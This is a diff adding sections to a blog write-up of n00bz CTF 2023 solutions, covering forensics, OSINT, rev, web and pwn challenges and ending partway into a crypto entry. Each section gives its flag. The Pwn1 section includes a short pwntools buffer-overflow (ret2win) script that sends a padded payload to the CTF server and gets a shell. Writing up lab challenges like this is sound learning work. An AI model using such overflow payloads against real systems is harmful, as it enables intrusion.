@@ -251,7 +251,69 @@ I managed to solve a variety of challenges from various categories.</p>
 <img class=img-fluid alt="n00bz CTF 2023" src=./images/forensics/cmds.png loading=lazy>
 <p>n00bz{L5B_1n_w4v_f1l3s?!!!}</p>
 
-<
+<h5>BeepBop</h5>
+<p>This challenge provided a wav file. The name BeepBop sounds like a challenge related to sound. So I tried using MMSSTV and succeeded.</p>
+<img class=img-fluid alt="n00bz CTF 2023" src=./images/forensics/foren3.png loading=lazy>
+<p>n00bz{beep_bop_you_found_me!}</p>
+
+<h3>OSINT</h3>
+<h5>Mission Moon</h5>
+<img class=img-fluid alt="n00bz CTF 2023" src=./images/osint/sc.png loading=lazy height="500" width="400">
+<p>I immediately guessed that it is Chandrayaan 2 by looking at the image and looked for the latitude and longitude.</p>
+<p>n00bz{Vikram_Pragyan_70.9_22.8}</p>
+
+<h3>Rev</h3>
+<h5>Welcome</h5>
+<p>This challenged provided a ELF file. By looking at the title, I ran strings hoping to get the flag and done.</p>
+<img class=img-fluid alt="n00bz CTF 2023" src=./images/rev/sc.png loading=lazy>
+<p>n00bz{N3v3R_$torE_$ENs1TIV3_1nFOrMa7IOn_P1aiNtexT_In_yoUr_bin4rI3S!!!!!}</p>
+
+<h3>Web</h3>
+<h5>Club_N00b</h5>
+<p>Looking at the web page,</p>
+<img class=img-fluid alt="n00bz CTF 2023" src=./images/web/web1sc1.png loading=lazy width=955 height=382>
+<p>The word 'radical' was highlighted</p>
+<img class=img-fluid alt="n00bz CTF 2023" src=./images/web/web1sc2.png loading=lazy width=955 height=382>
+<p>When clicked on the check status button, it navigated to /check?secret_phrase=nope. So I replaced 'nope' with 'radical'.</p>
+<img class=img-fluid alt="n00bz CTF 2023" src=./images/web/web1sc3.png loading=lazy width=955 height=382>
+<p>n00bz{see_you_in_the_club_acting_real_nice}</p>
+
+<h5>Robots</h5>
+<p>As the name suggests, the flag was in /robots.txt.</p>
+<img class=img-fluid alt="n00bz CTF 2023" src=./images/web/web2sc.png loading=lazy width=955 height=382>
+<p>n00bz{1_f0und_7h3_r0b0ts!}</p>
+
+<h5>Secret Group</h5>
+<p>It was a challenge requiring to change headers.</p>
+<img class=img-fluid alt="n00bz CTF 2023" src=./images/web/web3sc1.png loading=lazy width=955 height=382>
+<p>I followed the response to get the flag.</p>
+<img class=img-fluid alt="n00bz CTF 2023" src=./images/web/web3sc2.png loading=lazy width=955 height=382>
+<p>n00bz{y0u_4r3_n0w_4_v4l1d_m3mb3r_0f_th3_s3cr3t_gr0up!}</p>
+
+<h3>Pwn</h3>
+<h5>Flag Shop</h5>
+<p>It was a basic integer overflow challenge on netcat.</p>
+<img class=img-fluid alt="n00bz CTF 2023" src=./images/pwn/flagshop.png loading=lazy>
+<p>n00bz{5h0p_g0t_h3ck3d_4nd_fl4g_g0t_570l3n!}</p>
+
+<h5>Pwn1</h5>
+<p>This challenge provided a ELF file. It was using netcat. After analyzing the ELF file, I found that it was a ret2win chall. I found the addresses of the return and the win() function from Ghidra and wrote the following script.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py">
+<span class="line"><span class="kn">from</span> <span class="n">pwn</span> <span class="k">import</span> <span class="o">*</span></span>
+<span class="line"><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">"challs.n00bzunit3d.xyz"</span><span class="p">,</span> <span class="mi">35932</span><span class="p">)</span></span>
+<span class="line"><span class="nb">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">())</span></span>
+<span class="line"><span class="n">payload</span> <span class="o">=</span> <span class="nb">b'A'</span><span class="o">*</span><span class="mi">64</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0x00401249</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0x0040124a</span><span class="p">)</span></span>
+<span class="line"><span class="nb">print</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span></span>
+<span class="line"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span></span>
+<span class="line"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span>
+</code></pre></div>
+<p>After executing this python file, It gave access to the terminal. From there, I got the flag.</p>
+<img class=img-fluid alt="n00bz CTF 2023" src=./images/pwn/pwn1.png loading=lazy>
+<p>n00bz{PWN_1_Cl34r3d_n0w_0nt0_PWN_2!!!}</p>
+
+<h3>Crypto</h3>
+<h5>MaaS</h5>
+<p>This challenge provided a python file running on netcat. </p>
 
 </div><hr /><div class="post-navs d-flex mb-3 justify-content-evenly">
   <div class="post-nav post-prev"><i class="fas fa-fw fa-chevron-left"></i>
